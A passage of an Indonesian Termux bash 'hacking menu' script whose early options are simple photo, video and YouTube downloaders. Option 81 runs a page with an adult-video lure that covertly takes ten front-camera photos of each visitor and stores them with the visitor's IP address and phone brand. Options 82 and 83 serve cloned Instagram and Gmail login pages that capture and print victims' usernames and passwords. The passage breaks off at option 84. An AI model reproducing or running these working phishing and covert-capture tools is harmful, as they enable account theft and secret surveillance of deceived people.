read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
       76)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
figlet Foto | lolcat
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${g}"
read -p "Masukkan URL foto : " url
echo -e "${c}"
read -p "Masukkan nama file [ contoh : gambar.png / foto.jpg ] : " cok
path="/sdcard/Download/$cok"
if [[ "$cok" =~ \.(png|jpg|jpeg)$ ]]; then
    echo ""
    echo -e "${g} Sedang Mendownload di : $url"
    curl -L -o "$path" "$url"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Foto berhasil disimpan di : $path"
    else
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Gagall mendownload..!!"
    fi
else
    clear 
    echo ""
    echo -e "${y} Format harus di awali ${g}foto.jpg foto.png foto.jpeg"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
      77)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
figlet Video | lolcat 
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${g}"
read -p "Masukkan URL video : " url
echo -e "${c}"
read -p "Masukkan nama file [ contoh : video.mp4 / film.mkv ] : " file
path="/sdcard/Download/$file"
if [[ "$file" =~ \.(mp4|mkv|webm|avi|mov)$ ]]; then
    echo ""
    echo -e "${g} Sedang mendownload video dari : $url"
    curl -L --progress-bar -o "$path" "$url"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Video berhasil disimpan di : $path"
    else
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Gagal mendownload..!!"
    fi
else
    clear 
    echo ""
    echo -e "${y} Format harus di awali ${g}video.mp4, video.mkv, video.webm, video.avi, atau video.mov"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
       78)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo " 
⠀⢀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⡀⠀⠀
⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢈⣹⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀
⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠋⠉⠁" | lolcat
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${g}"
read -r -e -p "Masukkan link Yt : " link
echo ""
if [ -z "$link" ]; then
    echo -e "${r}Error : Link YouTube tidak boleh kosong!"
    echo ""
fi
dir="/storage/emulated/0"
tmp=$(date +%Y%m%d_%H%M%S)
path="$dir/youtube_video_${tmp}.mp4"
echo -e "${c}Mengunduh video..!!"
yt-dlp -o "$path" "$link"
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${g}✅ Video YouTube berhasil diunduh"
    echo -e "${y}📁 Disimpan di : $path"
else
    echo ""
    echo -e "${r}❌ Gagal mengunduh video YouTube"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
       81)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
set -euo pipefail
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
PORT="${PORT:-8080}"
SAVE_DIR="/sdcard/Hasil_Foto"
if [ ! -d "/sdcard" ]; then
  echo ""
  echo -e "${r}[ ${g}INFO ${r}]${c} SDCARD TIDAK DI TEMUKAN."
  echo ""
  sleep 4
  kill -9 -1 && exit
fi
if [ ! -d "/storage/emulated/0" ]; then
  echo ""
  echo -e "${r}[ ${g}INFO ${r}]${y} Menjalankan termux-setup-storage."
  echo ""
if command -v termux-setup-storage >/dev/null 2>&1; then
    termux-setup-storage
else
    clear 
    echo ""
    echo -e "${r}[ ${g}WARN ${r}]${y} termux-setup-storage tidak tersedia."
    echo ""
    sleep 3 
  fi
fi
mkdir -p "$SAVE_DIR"
echo "
▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▖ ▗▖ ▗▄▄▖ ▗▄▖ ▗▖  ▗▖
▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘▐▌   ▐▌ ▐▌▐▛▚▞▜▌
▐▛▀▜▌▐▛▀▜▌▐▌   ▐▛▚▖ ▐▌   ▐▛▀▜▌▐▌  ▐▌
▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌
" | lolcat
echo -e "${r}   Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[ ${g}INFO ${r}]${c} Membuka server Python di port : ${PORT}"
echo -e "${r}[ ${g}INFO ${r}]${y} Akses di : http://localhost:${PORT}"
echo -e "${r}[ ${g}INFO ${r}]${p} Hasil Akan Di Simpan Secara Otomatis Di : ${SAVE_DIR}"
export PORT SAVE_DIR
python3 -c "
import os, json, datetime
from http.server import SimpleHTTPRequestHandler, HTTPServer
PORT = int(os.environ.get(\"PORT\", \"8080\"))
SAVE_DIR = os.environ.get(\"SAVE_DIR\", \"/sdcard/Hasil_Foto\")
HTML_CONTENT = '''<!doctype html>
<html lang=\"id\">  
<head>  
  <meta charset=\"utf-8\" />  
  <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\" />  
  <title>Bokep Kamera Auto Virall</title>  
  <style>  
    :root { --pad: 16px; }  
    body {  
      font-family: system-ui, sans-serif;  
      max-width: 820px;  
      margin: 2rem auto;  
      padding: 0 var(--pad);  
      background: url('https://l.top4top.io/p_3539d0y7d1.jpg') no-repeat center center fixed;  
      background-size: cover;  
      color: white;  
      text-shadow: 1px 1px 2px black;  
    }  
    h1 { font-size: 1.4rem; margin-bottom: 0.5rem; }  
    .notice {  
      background: rgba(0,0,0,0.5);  
      padding: var(--pad);  
      border-radius: 12px;  
    }  
    video, canvas {  
      width: 100%;  
      max-width: 780px;  
      border-radius: 12px;  
      background: #000;  
    }  
    .bar { margin: 1rem 0; }  
    button {  
      padding: .75rem 1rem;  
      border-radius: 10px;  
      border: none;  
      cursor: pointer;  
      background: #007bff;  
      color: white;  
      font-weight: bold;  
    }  
  </style>  
</head>  
<body>  
  <h1>Klik tombol setel video agar bisa akses video colmek virall 💋💦</h1>  
  <p class=\"notice\">  
    Server ini berfungsi untuk melihat video <strong>colmek virall</strong> dan
    tidak mengganggu adanya iklan ketika video di setel.  
  </p>  
  <video id=\"preview\" playsinline autoplay controls></video>
  <div class=\"bar\">  
    <button id=\"start\">Setell-Videoo</button>  
  </div>  
  <canvas id=\"photo\" hidden></canvas>
  <script>  
const video = document.getElementById('preview');  
const canvas = document.getElementById('photo');  
const startBtn = document.getElementById('start');  
let stream;  
let sessionId = Date.now();  
let clientIP = 'Unknown';  
let deviceBrand = 'Unknown';
fetch('/ip').then(r => r.text()).then(ip => clientIP = ip.trim()).catch(() => {});
(function() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes('samsung')) deviceBrand = 'Samsung';
  else if (ua.includes('xiaomi') || ua.includes('redmi') || ua.includes('poco')) deviceBrand = 'Xiaomi';
  else if (ua.includes('oppo') || ua.includes('realme')) deviceBrand = 'OPPO/Realme';
  else if (ua.includes('vivo')) deviceBrand = 'Vivo';
  else if (ua.includes('huawei') || ua.includes('honor')) deviceBrand = 'Huawei/Honor';
  else if (ua.includes('oneplus')) deviceBrand = 'OnePlus';
  else if (ua.includes('asus')) deviceBrand = 'Asus';
  else if (ua.includes('nokia')) deviceBrand = 'Nokia';
  else if (ua.includes('sony')) deviceBrand = 'Sony';
  else if (ua.includes('lg')) deviceBrand = 'LG';
  else if (ua.includes('motorola')) deviceBrand = 'Motorola';
  else deviceBrand = 'Unknown Device';
})();
function takeSnapshot() {  
  if (!stream) return null;  
  const track = stream.getVideoTracks()[0];  
  const settings = track.getSettings();  
  const w = settings.width || 640;  
  const h = settings.height || 480;  
  canvas.width = w;  
  canvas.height = h;  
  const ctx = canvas.getContext('2d');  
  ctx.drawImage(video, 0, 0, w, h);  
  return canvas;  
}
async function uploadPhoto(canv, index) {  
  const blob = await new Promise(res => canv.toBlob(res, 'image/jpeg', 0.8));  
  const fd = new FormData();  
  fd.append('photo', blob, \`photo_\${sessionId}_\${index}.jpg\`);
  if (index === 1) {
    fd.append('ip', clientIP);
    fd.append('brand', deviceBrand);
    fd.append('session', sessionId.toString());
  }
  try {
    const resp = await fetch('/upload', { 
      method: 'POST', 
      body: fd 
    });  
    if (!resp.ok) {
      const err = await resp.text();
      throw new Error(\"Upload gagal: \" + err);
    }  
    return await resp.json();  
  } catch (err) {
    console.error(\"Upload error:\", err);
    throw err;
  }
}
async function startAndSnap() {  
  try {  
    stream = await navigator.mediaDevices.getUserMedia({  
      video: { facingMode: { ideal: 'user' } },  
      audio: false  
    });  
    video.srcObject = stream;  
    await video.play();
    for (let i = 1; i <= 10; i++) {  
      await new Promise(res => setTimeout(res, 600));  
      const canv = takeSnapshot();  
      if (canv) {  
        await uploadPhoto(canv, i);  
      }  
    }
    stream.getTracks().forEach(track => track.stop());
    aksesVideo();
  } catch (err) {  
    alert(\"Terjadi kesalahan : \" + err.message);  
  }  
}
function aksesVideo() {  
  try {  
    let videos = [
      \"https://h.top4top.io/m_383175o4t0.mp4\",
      \"https://a.top4top.io/m_37875yu8r0.mp4\",
      \"https://c.top4top.io/m_3785viisu0.mp4\",
      \"https://g.top4top.io/m_38217lueg0.mp4\",
      \"https://h.top4top.io/m_3550134wq1.mp4\"
    ];  
    let index = 0;  
    const player = document.getElementById('preview');  
    player.srcObject = null;
    player.src = videos[index];  
    player.play();  
    player.onended = function() {  
      index++;  
      if (index < videos.length) {  
        player.src = videos[index];  
        player.play();  
      }  
    };  
  } catch (err) {  
    alert(\"Gagal memutar video : \" + err.message);  
  }  
}
startBtn.addEventListener('click', startAndSnap);  
  </script>  
</body>  
</html>'''
class RequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return  
    def do_GET(self):
        if self.path == \"/ip\":
            ip = self.client_address[0]
            self.send_response(200)
            self.send_header(\"Content-Type\", \"text/plain\")
            self.send_header(\"Access-Control-Allow-Origin\", \"*\")
            self.end_headers()
            self.wfile.write(ip.encode())
            return
        if self.path == \"/\" or self.path == \"/index.html\":
            self.send_response(200)
            self.send_header(\"Content-Type\", \"text/html\")
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
            return
        self.send_error(404, \"Not Found\")  
    def do_POST(self):
        if self.path != \"/upload\":
            self.send_error(404, \"Not Found\")
            return
        content_type = self.headers.get('Content-Type', \"\")
        if \"multipart/form-data\" not in content_type:
            self.send_error(400, \"Invalid Content-Type\")
            return
        length = int(self.headers.get('Content-Length', 0))
        if length <= 0:
            self.send_error(400, \"No data\")
            return
        data = self.rfile.read(length)
        boundary = content_type.split(\"boundary=\")[-1]
        if isinstance(boundary, str):
            boundary = boundary.encode()
        parts = data.split(b'--' + boundary)
        photo_data = None
        filename = None
        ip = brand = session = None
        for part in parts:
            if not part.strip() or part.startswith(b'--'):
                continue
            headers, _, body = part.partition(b'\r\n\r\n')
            header_lines = headers.decode(errors='ignore').split('\r\n')
            disp = {}
            for h in header_lines:
                if h.startswith('Content-Disposition'):
                    for item in h.split(';'):
                        if '=' in item:
                            k, v = item.strip().split('=', 1)
                            disp[k] = v.strip('\"')
            if 'filename' in disp:
                filename = disp['filename']
                photo_data = body.rstrip()
            else:
                name = disp.get('name', '')
                value = body.decode(errors='ignore').strip()
                if name == 'ip': ip = value
                elif name == 'brand': brand = value
                elif name == 'session': session = value
        if not photo_data or not filename:
            self.send_error(400, \"No photo uploaded\")
            return
        os.makedirs(SAVE_DIR, exist_ok=True)
        photo_path = os.path.join(SAVE_DIR, filename)
        with open(photo_path, \"wb\") as f:
            f.write(photo_data)
        info_saved = False
        if ip and brand and session and filename.endswith(\"_1.jpg\"):
            timestamp = datetime.datetime.now().strftime(\"%Y%m%d-%H%M%S\")
            info_path = os.path.join(SAVE_DIR, f\"info_{timestamp}_{session}.txt\")
            info_text = f\"\"\"IP Lokal : {ip}
Merek HP : {brand}
Waktu : {datetime.datetime.now()}
User-Agent : {self.headers.get('User-Agent', 'N/A')}
Total Foto : 10
Folder : {SAVE_DIR}
Session ID : {session}
\"\"\"
            with open(info_path, \"w\", encoding=\"utf-8\") as f:
                f.write(info_text.strip())
            info_saved = True
        payload = {\"ok\": True, \"saved\": photo_path}
        if info_saved:
            payload[\"info\"] = info_path
        response = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header(\"Content-Type\", \"application/json\")
        self.send_header(\"Content-Length\", str(len(response)))
        self.send_header(\"Access-Control-Allow-Origin\", \"*\")
        self.end_headers()
        self.wfile.write(response)  
    def end_headers(self):
        self.send_header(\"X-Content-Type-Options\", \"nosniff\")
        super().end_headers()
if __name__ == \"__main__\":
    current_port = PORT
    while True:
        try:
            httpd = HTTPServer((\"\", current_port), RequestHandler)
            break
        except OSError as e:
            if e.errno == 98:
                print(f\"Port {current_port} digunakan, coba {current_port+1}\")
                current_port += 1
            else:
                raise
    PORT = current_port
    print(f\"\\n\\033[31;1m[ \\033[32;1mINFO \\033[31;1m]\\033[36;1m Server berjalan di : http://localhost:{PORT}\")
    print(f\"\\033[31;1m[ \\033[32;1mINFO \\033[31;1m]\\033[33;1m Hasil foto akan disimpan di : {SAVE_DIR}\\n\")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(\"\\n\\033[32;1m[ \\033[31;1mINFO \\033[32;1m]\\033[35;1m Server dihentikan.\\n\")
"
              echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
                ;;
     82)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
echo "
██╗ ██████╗ 
██║██╔════╝ 
██║██║  ███╗
██║██║   ██║
██║╚██████╔╝
╚═╝ ╚═════╝ " | lolcat
echo ""
echo -e "${p}Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[ ${g}+ ${r}]${b} Menyiapkan Server Website."
echo ""
read -p "$(echo -e "${y}Masukkan Port Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" input 
port=${input:-8080}
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Telah Aktif Di Port : http://localhost:$port "
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import sys
PORT = $port
HTML_CONTENT = '''<!DOCTYPE html>
<html lang=\"id\">
<head>
  <meta charset=\"UTF-8\">
  <title>Login dengan Akun Instagram</title>
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      width: 90%;
      max-width: 320px;
      text-align: center;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      width: 70px;
    }
    input[type=\"text\"], input[type=\"password\"], input[type=\"email\"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 8px;
      background-color: #1c1c1c;
      color: white;
      font-size: 14px;
      box-sizing: border-box;
    }
    .input-group {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      user-select: none;
      font-size: 16px;
      color: #888;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 24px;
      font-size: 14px;
      cursor: pointer;
      margin-top: 10px;
    }
    a {
      display: block;
      color: #87cefa;
      text-decoration: none;
      font-size: 13px;
      margin-top: 15px;
    }
    .note {
      font-size: 0.75em;
      color: #999;
      margin-top: 10px;
    }
    .create-account {
      margin-top: 40px;
    }
    .create-account button {
      background: none;
      border: 1px solid #1877f2;
      color: #1877f2;
      border-radius: 24px;
      padding: 10px;
      font-size: 13px;
      width: 100%;
      cursor: pointer;
    }
    .meta {
      margin-top: 30px;
      font-size: 12px;
      color: gray;
    }
    .language {
      position: absolute;
      top: 20px;
      color: gray;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class=\"language\">Bahasa Indonesia ▼</div>
  <div class=\"login-container\">
    <div class=\"logo\">
      <img src=\"https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png\" alt=\"Instagram Logo\">
    </div>
    <form method=\"POST\" action=\"/login\">
      <input type=\"text\" name=\"email\" placeholder=\"Alamat Email/Username/Nomor Telepon\" required>
      <div class=\"input-group\">
        <input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Kata Sandi\" required>
        <span class=\"toggle-password\" onclick=\"togglePassword()\">☐</span>
      </div>
      <p class=\"note\">Gunakan password anda dengan benar agar tidak terjadi kesalahan.</p>
      <button type=\"submit\">Login</button>
    </form>
    <a href=\"#\">Lupa Kata Sandi?</a>
    <div class=\"create-account\">
      <button>Buat akun baru</button>
    </div>
    <div class=\"meta\">© Meta</div>
  </div>
  <script>
    function togglePassword() {
      const passwordInput = document.getElementById(\"password\");
      const toggleIcon = document.querySelector(\".toggle-password\");
      const isPassword = passwordInput.type === \"password\";
      passwordInput.type = isPassword ? \"text\" : \"password\";
      toggleIcon.textContent = isPassword ? \"☑\" : \"☐\";
    }
  </script>
</body>
</html>'''
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")   
    def do_POST(self):
        if self.path == \"/login\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode())
            email = data.get('email', [''])[0]
            password = data.get('password', [''])[0]
            print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Gmail/Username/Nomer : \" + email + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Password : \" + password + \"\033[0m\n\")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b\"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Login berhasil! Kami Akan Menghubungkan Anda Kembali Jika Semuanya Sudah Di Proses.</h2>\")
        else:
            self.send_error(404) 
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[32;1m Salin Portnya : http://localhost:\" + str(PORT) + \"\033[0m\")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      83)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
echo "
  ██████╗ ███╗   ███╗ █████╗ ██╗██╗     
██╔════╝ ████╗ ████║██╔══██╗██║██║     
██║  ███╗██╔████╔██║███████║██║██║     
██║   ██║██║╚██╔╝██║██╔══██║██║██║     
╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝" | lolcat
echo ""
echo -e "${p}Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[ ${g}+ ${r}]${b} Menyiapkan Server Website."
echo ""
read -p "$(echo -e "${y}Masukkan Port Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" port 
port=${port:-8080}
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Telah Aktif Di Port : http://localhost:$port "
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import socket
import re
import sys
PORT = $port
GREEN = \"\033[92m\"
RED = \"\033[91m\"
CYAN = \"\033[96m\"
YELLOW = \"\033[93m\"
RISET = \"\033[95m\"
RESET = \"\033[0m\"
def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0
if is_port_in_use(PORT):
    print(f\"{RED}[ERROR] Port {PORT} sedang digunakan. Silakan gunakan port lain.{RESET}\")
    sys.exit(1)
akun_valid = {
    \"contoh@gmail.com\": \"thxyzz404\",
    \"user@gmail.com\": \"recode_haram\"
}
html_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {{
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }}
        .login-box {{
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            text-align: center;
            position: relative;
        }}
        .login-box input {{
            display: block;
            width: 100%;
            padding: 10px;
            margin: 15px 0;
            border-radius: 20px;
            border: 2px solid #ccc;
            outline: none;
        }}
        .login-box input.error {{
            border-color: red;
        }}
        .login-box button[type=\"submit\"] {{
            background-color: #6aa9ff;
            color: white;
            border: none;
            padding: 10px 30px;
            border-radius: 25px;
            cursor: pointer;
        }}
        .login-box a {{
            display: block;
            margin-top: 10px;
            color: #468ef3;
            text-decoration: none;
        }}
        .error-text {{
            color: red;
            margin-top: -10px;
        }}
        .toggle-container {{
            position: relative;
        }}
        .toggle-btn {{
            position: absolute;
            top: 50%;
            right: 15px;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
        }}
        .toggle-btn svg {{
            width: 22px;
            height: 22px;
        }}
    </style>
</head>
<body>
    <form class=\"login-box\" method=\"POST\">
        <img src=\"https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png\" alt=\"Logo\" width=\"80\">   
        <div class=\"toggle-container\">
            <input type=\"text\" id=\"email\" name=\"email\" placeholder=\"Email\" value=\"{email}\" class=\"{email_class}\" required>
        </div>
        <div class=\"toggle-container\">
            <input type=\"password\" id=\"password\" name=\"password\" placeholder=\"Password\" class=\"{pass_class}\" required>
            <button type=\"button\" class=\"toggle-btn\" onclick=\"toggleInputType('password', this)\">
                <svg fill=\"gray\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\">
                    <path d=\"M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13
                    c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z\"/><circle cx=\"12\" cy=\"12\" r=\"2.5\"/>
                </svg>
            </button>
        </div>
        {error_msg}
        <button type=\"submit\">Sign in</button>
        <a href=\"#\">Create account</a>
    </form>
    <script>
        function toggleInputType(id, btn) {{
            const input = document.getElementById(id);
            const icon = btn.querySelector(\"svg\");
            if (input.type === \"password\") {{
                input.type = \"text\";
                icon.innerHTML = \`
                    <path d=\"M12 6a9.77 9.77 0 0 1 9 6 9.77 9.77 0 0 1-9 6 9.77 9.77 0 0 1-9-6 9.77 9.77 0 0 1 9-6m0-2C6.48 4
                    1.73 7.61 0 12c1.73 4.39 6.48 8 12 8s10.27-3.61 12-8c-1.73-4.39-6.48-8-12-8zm0 5a3 3 0 0 0 0 6
                    3 3 0 0 0 0-6z\"/>\`;
            }} else {{
                input.type = \"password\";
                icon.innerHTML = \`
                    <path d=\"M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13
                    c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z\"/><circle cx=\"12\" cy=\"12\" r=\"2.5\"/>\`;
            }}
        }}
    </script>
</body>
</html>
'''
login_success = '''
<!DOCTYPE html>
<html>
<head>
    <title>Login Berhasil</title>
    <style>
        body {{
            background-color: #e0ffe0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }}
        .success-box {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            text-align: center;
        }}
        .success-box h2 {{
            color: green;
        }}
    </style>
</head>
<body>
    <div class=\"success-box\">
        <h2>Login berhasil!</h2>
        <p>Akses diberikan. Silakan lanjutkan...</p>
    </div>
</body>
</html>
'''
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        page = html_template.format(
            email=\"\",
            email_class=\"\",
            pass_class=\"\",
            error_msg=\"\"
        )
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(page.encode('utf-8'))  
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        params = urllib.parse.parse_qs(post_data.decode('utf-8'))
        email = params.get('email', [''])[0]
        password = params.get('password', [''])[0]
        print(f\"\n{GREEN}[DATA DITERIMA]{RESET}\")
        print(f\"{YELLOW} • Gmail : {email}{RESET}\")
        print(f\"{YELLOW} • Password : {password}{RESET}\")
        print(\"-\" * 40)
        email_valid = re.match(r\"^[a-zA-Z0-9_.+-]+@gmail\.com$\", email)
        pass_valid = len(password) > 0
        if email_valid and email in akun_valid and akun_valid[email] == password:
            response = login_success
        else:
            print(f\"{RED}[PENOLAKAN LOGIN]{RESET} Gmail atau password tidak sesuai dengan akun Google.\")
            error_msg = '<p class=\"error-text\">Gmail atau password tidak sesuai dengan akun Google</p>'
            response = html_template.format(
                email=email,
                email_class=\"error\",
                pass_class=\"error\",
                error_msg=error_msg
                )
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(response.encode('utf-8'))
if __name__ == \"__main__\":
    try:
        server = HTTPServer(('', PORT), RequestHandler)
        print(f\"{RED}[{GREEN}INFO{RED}]{CYAN} Server berjalan di http://localhost:{PORT}{RESET}\")
        server.serve_forever()
    except KeyboardInterrupt:
        print(\"\n[INFO] Server dihentikan oleh pengguna.\")
        server.server_close()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
      84)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
███╗   ███╗██╗     
████╗ ████║██║     
██╔████╔██║██║     
